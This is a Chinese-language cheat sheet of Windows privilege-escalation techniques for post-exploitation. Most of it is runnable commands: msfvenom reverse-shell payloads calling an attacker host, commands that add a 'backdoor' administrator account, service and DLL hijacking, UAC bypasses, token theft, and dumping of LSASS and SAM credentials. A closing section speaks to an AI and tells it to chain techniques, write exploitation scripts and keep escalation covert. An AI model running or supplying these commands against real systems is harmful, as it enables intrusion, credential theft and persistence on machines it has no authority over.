# Windows 提权

Windows 提权是后渗透的关键步骤，涉及系统漏洞、配置错误、凭证获取等多种技术。

## 信息收集

### 系统信息
```powershell
systeminfo
wmic qfe list
wmic os get caption,version,buildnumber,osarchitecture

# 补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 驱动信息
driverquery /v
```

### 用户和组
```powershell
whoami /all
net user
net localgroup administrators
net user <username>

# 当前权限
whoami /priv
```

### 网络信息
```powershell
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh firewall show config
```

### 进程和服务
```powershell
tasklist /svc
wmic service list brief
sc query
Get-Service
Get-Process
```

### 计划任务
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask
```

## 系统漏洞利用

### 内核漏洞

**检测工具**：
- Windows Exploit Suggester
- Watson
- Sherlock
- WES-NG

**常见漏洞**：
- MS16-032（Secondary Logon）
- MS17-010（EternalBlue）
- CVE-2020-0787（BITS）
- CVE-2021-1732（Win32k）
- CVE-2021-36934（HiveNightmare/SeriousSAM）

**利用示例**：
```powershell
# MS16-032
Invoke-MS16032 -Command "cmd.exe /c net user backdoor Password123! /add"

# CVE-2021-36934 (HiveNightmare)
icacls C:\Windows\System32\config\SAM
```

## 配置错误利用

### 服务权限

**枚举服务权限**：
```powershell
# PowerUp
Get-ModifiableServiceFile
Get-ModifiableService

# accesschk
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *
```

**服务二进制劫持**：
```powershell
# 查找可写服务
sc qc <service_name>

# 替换二进制
move C:\service\original.exe C:\service\original.exe.bak
copy C:\payload.exe C:\service\original.exe

# 重启服务
sc stop <service_name>
sc start <service_name>
```

**不安全的服务路径**：
```powershell
# 查找
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 利用
copy payload.exe "C:\Program Files\Vulnerable Service\program.exe"
```

### 注册表权限

**AlwaysInstallElevated**：
```powershell
# 检查
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 利用
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o payload.msi
msiexec /quiet /qn /i payload.msi
```

**服务注册表劫持**：
```powershell
# 查找可写注册表
Get-Acl HKLM:\System\CurrentControlSet\Services\* | Format-List

# 修改 ImagePath
reg add "HKLM\System\CurrentControlSet\Services\<service>" /v ImagePath /t REG_EXPAND_SZ /d "C:\payload.exe" /f
```

### DLL 劫持

**搜索顺序**：
1. 应用程序目录
2. System32
3. System
4. Windows
5. 当前目录
6. PATH 环境变量

**查找可劫持的 DLL**：
```powershell
# Process Monitor 监控
# 查找 NAME NOT FOUND 的 DLL

# PowerUp
Find-ProcessDLLHijack
Find-PathDLLHijack
```

**生成恶意 DLL**：
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o hijack.dll
```

## Token 操作

### Token 窃取

**Incognito**：
```
# Metasploit
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

**PowerShell**：
```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

### SeImpersonatePrivilege

**Potato 系列**：
- Hot Potato
- Rotten Potato
- Juicy Potato
- Rogue Potato
- Sweet Potato

**Juicy Potato**：
```powershell
# 检查权限
whoami /priv | findstr SeImpersonatePrivilege

# 利用
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user backdoor Password123! /add" -t *
```

**PrintSpoofer**：
```powershell
PrintSpoofer.exe -i -c cmd
```

## UAC 绕过

### 白名单程序

**eventvwr.exe**：
```powershell
# 修改注册表
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\payload.exe" /f
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v "DelegateExecute" /f

# 触发
eventvwr.exe
```

**fodhelper.exe**：
```powershell
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "C:\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /f

fodhelper.exe
```

### COM 接口

**CMSTPLUA**：
```powershell
# PowerShell 脚本利用
```

## 凭证获取

### LSASS Dump

**Mimikatz**：
```
privilege::debug
sekurlsa::logonpasswords
```

**ProcDump**：
```powershell
procdump.exe -ma lsass.exe lsass.dmp
```

**Comsvcs.dll**：
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
```

### SAM/SYSTEM

**注册表**：
```powershell
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

**Volume Shadow Copy**：
```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
```

## 自动化工具

### PowerUp

```powershell
# 导入
Import-Module PowerUp.ps1

# 全面检查
Invoke-AllChecks

# 特定检查
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
```

### WinPEAS

```powershell
winPEASx64.exe
winPEASx64.exe quiet
winPEASx64.exe systeminfo
```

### PrivescCheck

```powershell
Import-Module PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
```

---

**AI 发挥空间**：
- 根据系统版本选择合适的提权方法
- 分析系统配置发现提权路径
- 结合多种技术进行提权
- 开发自动化枚举和利用脚本

**反幻觉提示**：
- 不要假设所有系统都存在已知漏洞
- 验证目标系统的版本和补丁级别
- 测试提权方法的实际效果
- 注意提权操作的稳定性和隐蔽性
- 某些提权方法可能需要特定条件
